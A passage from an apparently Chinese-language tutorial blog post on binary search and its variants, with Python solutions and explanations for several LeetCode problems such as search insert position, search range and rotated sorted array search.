operator">=</span>binarySearch<span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>(2)递归写法</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyRecursion</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>  mid        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> binarySearchbyRecursion<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要记得Return 不然最后都是执行return -1，返回-1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> binarySearchbyRecursion<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>mid<span class="token number">-1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要记得Return 不然最后都是执行return -1，返回-1 </span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="变形1-无重复-有序"><a href="#变形1-无重复-有序" class="headerlink" title="变形1 无重复 有序"></a>变形1 无重复 有序</h2><h3 id="1-1-LTD35-搜索插入位置"><a href="#1-1-LTD35-搜索插入位置" class="headerlink" title="1.1 LTD35 搜索插入位置"></a>1.1 <a href="https://leetcode-cn.com/problems/search-insert-position/">LTD35 搜索插入位置</a></h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h4><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>你可以假设数组中无重复元素。</p><p>示例 1:</p><p>输入: [1,3,5,6], 5<br>输出: 2</p><p>示例 2:</p><p>输入: [1,3,5,6], 2<br>输出: 1</p><h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a><strong>解题：</strong></h4><p>这个题目完全就和咱们的二分查找一样，只不过有了一点改写，那就是将咱们的返回值改成了 left或者mid+1，具体实现过程见下图</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>  mid        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> left<span class="token comment" spellcheck="true">#或者为mid+1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-剑指-Offer-53-II-0～n-1中缺失的数字"><a href="#1-2-剑指-Offer-53-II-0～n-1中缺失的数字" class="headerlink" title="1.2  剑指 Offer 53 - II. 0～n-1中缺失的数字"></a>1.2  <a href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/">剑指 Offer 53 - II. 0～n-1中缺失的数字</a></h3><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>一个长度为n-1的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围0～n-1之内。在范围0～n-1内的n个数字中有且只有一个数字不在该数组中，请找出这个数字。</p><p> <strong>示例 1:</strong></p><pre><code>输入: [0,1,3]输出: 2</code></pre><p><strong>示例 2:</strong></p><pre><code>输入: [0]输出: 1</code></pre><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a><strong>解题思路</strong></h4><p>与leetcode35搜索插入位置有点子像，这里把Target想象成mid</p><p>在数组中找到mid！=nums[mid]，并返回mid插入数组中的位置。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">missingNumber</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :rtype: int        """</span>        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">!=</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">return</span> left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-LTD69-x-的平方根"><a href="#1-3-LTD69-x-的平方根" class="headerlink" title="1.3 LTD69. x 的平方根"></a>1.3 <a href="https://leetcode-cn.com/problems/sqrtx/">LTD69. x 的平方根</a></h3><h4 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h4><p>实现 <code>int sqrt(int x)</code> 函数:计算并返回 <em>x</em> 的平方根，其中 <em>x</em> 是非负整数。由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。</p><p><strong>示例 1:</strong></p><pre><code>输入: 4输出: 2</code></pre><p><strong>示例 2:</strong></p><pre><code>输入: 8输出: 2说明: 8 的平方根是 2.82842...,      由于返回类型是整数，小数部分将被舍去。</code></pre><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>用二分法判断，初始区间为[0,x]，然后不断的找最大的mid使得mid*mid&lt;=即可，即ans=mid。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre><code>class Solution(object):    def mySqrt(self, x):        &quot;&quot;&quot;        :type x: int        :rtype: int        &quot;&quot;&quot;        left,right,ans=0,x,-1        while left&lt;=right:            mid=left+(right-left)//2            if mid*mid&lt;=x:                ans=mid                left=mid+1            else:                right=mid-1        return ans</code></pre><h3 id="1-4-LTD50-Pow-x-n"><a href="#1-4-LTD50-Pow-x-n" class="headerlink" title="1.4 LTD50. Pow(x, n)"></a>1.4 <a href="https://leetcode-cn.com/problems/powx-n/">LTD50. Pow(x, n)</a></h3><p>题目描述</p><p>实现 <a href="https://www.cplusplus.com/reference/valarray/pow/">pow(<em>x</em>, <em>n</em>)</a> ，即计算 x 的 n 次幂函数（即，xn）。</p><p> <strong>示例 1：</strong></p><pre><code>输入：x = 2.00000, n = 10输出：1024.00000</code></pre><p>More:</p><p><a href="https://leetcode-cn.com/problems/first-bad-version/">第一个错误的版本</a></p><p><a href="https://leetcode-cn.com/problems/guess-number-higher-or-lower/">猜数字大小</a></p><h2 id="变形2-有序数组-但是有重复值"><a href="#变形2-有序数组-但是有重复值" class="headerlink" title="变形2 有序数组 但是有重复值"></a>变形2 有序数组 但是有重复值</h2><h3 id="2-1-LTD-34在排序数组中查找元素的第一个和最后一个位置"><a href="#2-1-LTD-34在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="2.1  LTD 34在排序数组中查找元素的第一个和最后一个位置"></a>2.1  <a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">LTD 34在排序数组中查找元素的第一个和最后一个位置</a></h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h4><p>给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。</p><p>如果数组中不存在目标值 target，返回 [-1, -1]。</p><p>示例 1：</p><p>输入：nums = [5,7,7,8,8,10], target = 8<br>输出：[3,4]</p><p>示例 2：</p><p>输入：nums = [], target = 0<br>输出：[-1,-1]</p><h4 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a><strong>思路1：</strong></h4><p>我们只需在这段代码中修改即可，nums[mid] == target 时则返回，nums[mid] &lt; target 时则移动左指针，在右区间进行查找， nums[mid] &gt; target时则移动右指针，在左区间内进行查找。</p><p>计算下边界时，当 target &lt;= nums[mid] 时，right = mid -1；target &gt; nums[mid] 时，left = mid + 1；</p><p>计算上边界时，当 target &lt; nums[mid] 时，right = mid -1; target &gt;= nums[mid] 时 left = mid + 1;刚好和计算下边界时条件相反，返回right。</p><h4 id="代码："><a href="#代码：" class="headerlink" title="代码："></a><strong>代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyLt32</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    upper<span class="token operator">=</span>upperBound<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span>    lower<span class="token operator">=</span>lowerBound<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>lower<span class="token operator">></span>upper<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不存在的情况</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>lower<span class="token punctuation">,</span>upper<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#计算下边界</span><span class="token keyword">def</span> <span class="token function">lowerBound</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往左边，移动右指针往左</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> left<span class="token comment" spellcheck="true">#返回left</span><span class="token comment" spellcheck="true">#计算上边界</span><span class="token keyword">def</span> <span class="token function">upperBound</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">>=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往右边，移动左指针往右</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> right<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="思路2：推荐，复用代码"><a href="#思路2：推荐，复用代码" class="headerlink" title="思路2：推荐，复用代码"></a><strong>思路2：</strong>推荐，复用代码</h4><p><strong>左边界：</strong>返回left，即为第一个等于target的索引</p><p><strong>右边界：</strong>即为taget+1的左边界-1：最后一个等于target的索引=第一个等于target+1的索引-1</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :type target: int        :rtype: List[int]        """</span>        <span class="token keyword">def</span> <span class="token function">leftBound</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>            <span class="token comment" spellcheck="true">#计算左边界</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>                mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;=</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    right<span class="token operator">=</span>mid<span class="token number">-1</span>                <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">return</span> left        left<span class="token operator">=</span>leftBound<span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span>        right<span class="token operator">=</span>leftBound<span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>right<span class="token operator">&lt;</span>left<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span>left<span class="token punctuation">,</span>right<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-找出第一个大于目标元素的索引"><a href="#2-2-找出第一个大于目标元素的索引" class="headerlink" title="2.2  找出第一个大于目标元素的索引"></a>2.2  找出第一个大于目标元素的索引</h3><h4 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>找出第一个大于目标元素的索引，若找不到目标元素，则返回-1</p><p>1.数组包含目标元素，找出在他后面的第一个元素</p><p>2.目标元素不在数组中，数组内的部分元素大于它，此时我们需要返回第一个大于他的元素</p><p>3.目标元素不在数组中，且数组中的所有元素都大于它，那么我们此时返回数组的第一个元素即可</p><p>4.目标元素不在数组中，且数组中的所有元素都小于它，那么我们此时没有查询到，返回 -1 即可。</p><p>示例 1：</p><p>输入：nums =[1,3,5,5,6,6,8,9,11], target = 5<br>输出：4</p><p>示例 2：</p><p>输入：nums =[1,3,5,5,6,6,8,9,11], target = 4<br>输出：-1</p><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a><strong>解题思路：</strong></h4><p>在leetcode 34题目基础上，找到右边界+1即可。</p><h4 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a><strong>代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyFirstUpIndex</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">>=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往右边</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">0</span><span class="token operator">|</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> mid            <span class="token keyword">else</span><span class="token punctuation">:</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-找出最后一个小于目标元素的索引"><a href="#2-3-找出最后一个小于目标元素的索引" class="headerlink" title="2.3 找出最后一个小于目标元素的索引"></a>2.3 找出最后一个小于目标元素的索引</h3><h4 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h4><p>nums = {1,3,5,5,6,6,8,9,11} target = 7</p><h4 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h4><pre class="line-numbers language-python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="变形3-不完全有序-不含重复值"><a href="#变形3-不完全有序-不含重复值" class="headerlink" title="变形3  不完全有序 不含重复值"></a>变形3  不完全有序 不含重复值</h2><h3 id="3-1-LTD33-搜索旋转排序数组—查找目标元素（不含重复元素）"><a href="#3-1-LTD33-搜索旋转排序数组—查找目标元素（不含重复元素）" class="headerlink" title="3.1 LTD33 搜索旋转排序数组—查找目标元素（不含重复元素）"></a>3.1 <a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">LTD33 搜索旋转排序数组—查找目标元素（不含重复元素）</a></h3><h4 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>整数数组 <code>nums</code> 按升序排列，数组中的值 <strong>互不相同</strong> 。</p><p>在传递给函数之前，<code>nums</code> 在预先未知的某个下标 <code>k</code>（<code>0 &lt;= k &lt; nums.length</code>）上进行了 <strong>旋转</strong>，使数组变为 <code>[nums[k], nums[k+1], ..., nums[n-1], nums[0], nums[1], ..., nums[k-1]]</code>（下标 <strong>从 0 开始</strong> 计数）。例如， <code>[0,1,2,4,5,6,7]</code> 在下标 <code>3</code> 处经旋转后可能变为 <code>[4,5,6,7,0,1,2]</code> 。</p><p>给你 <strong>旋转后</strong> 的数组 <code>nums</code> 和一个整数 <code>target</code> ，如果 <code>nums</code> 中存在这个目标值 <code>target</code> ，则返回它的下标，否则返回 <code>-1</code> 。</p><p> <strong>示例 1：</strong></p><pre><code>输入：nums = [4,5,6,7,0,1,2], target = 0输出：4</code></pre><p><strong>示例 2：</strong></p><pre><code>输入：nums = [4,5,6,7,0,1,2], target = 3输出：-1</code></pre><p><strong>示例 3：</strong></p><pre><code>输入：nums = [1], target = 0输出：-1</code></pre><h4 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h4><p>当我们将数组从中间分开成左右两部分的时候，首先需要判断mid的位置；然后判断target的位置；所以2x2=4,会有四种组合</p><p><strong>第一步：判断mid的位置：</strong></p><p>可以发现的是，我们将数组从中间分开成左右两部分的时候，一定有一半的数组是有序的。拿示例来看，我们从 6 这个位置分开以后数组变成了 [4, 5, 6] 和 [7, 0, 1, 2] 两个部分，其中左边 [4, 5, 6] 这个部分的数组是有序的，因为有序数组 ，我们就可以用到前面的二分查找。所以mid的位置就是两种情况：</p><p>（1）mid的左边是有序的，即[left,mid]有序，[mid,right]无序。我们可以使用num[mid]与num[left]做比较，可以得出当nums[mid]&gt;=nums[left]时候，mid的左边是有序数组。</p><p>​        <strong>第二步：判断target的位置</strong></p><p>​        前提条件：mid的左边是有序数组；现在我们来判断target的位置</p><p>​        a.当target落在mid的左边区域（target&lt;nums[mid] and target&gt;=nums[left]），即有序的，则right=mid-1;往左查找。这时候注意target需要包含=num[left]的情况。</p><p>​        b.当target落在mid的右边无序区域，需要往右查找：left=mid+1</p><p>（2）mid的右边是有序的，即[left,mid]无序，[mid,right]有序。可以得出当nums[mid]&lt;nums[left]时候，mid的右边是有序数组。其实我们只分析一种情况，另外一种可以直接用else。</p><p>​        <strong>第二步：判断target的位置</strong></p><p>​        前提条件：mid的右边是有序数组；现在我们来判断target的位置</p><p>​        a.当target落在mid的右边有序区域（target&gt;nums[mid] and target&lt;nums[left]），则left=mid+1;往右查找。其实这个条件与（1）.a的条件是相反的。</p><p>​        b.当target落在mid的左边无序区域，需要往左查找：right=mid-1</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">BinarySearchIndisOrder</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token comment" spellcheck="true">#step1 判断mid的位置</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> mid        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>            <span class="token comment" spellcheck="true">#step2 判断target的位置</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#target在左边</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]无序，[mid,right]有序</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#target在右边</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">#没有查到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>时间复杂度：O(logn)，其中 nn 为nums 数组的大小。整个算法时间复杂度即为二分查找的时间复杂度 O(log n)O(logn)。</p><p>空间复杂度： O(1)O(1) 。我们只需要常数级别的空间存放变量。</p><h3 id="3-2-LTD153-寻找旋转排序数组中的最小值-不含重复值"><a href="#3-2-LTD153-寻找旋转排序数组中的最小值-不含重复值" class="headerlink" title="3.2 LTD153 寻找旋转排序数组中的最小值  不含重复值"></a>3.2 <a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/">LTD153 寻找旋转排序数组中的最小值</a>  不含重复值</h3><h4 id="题目描述：-5"><a href="#题目描述：-5" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 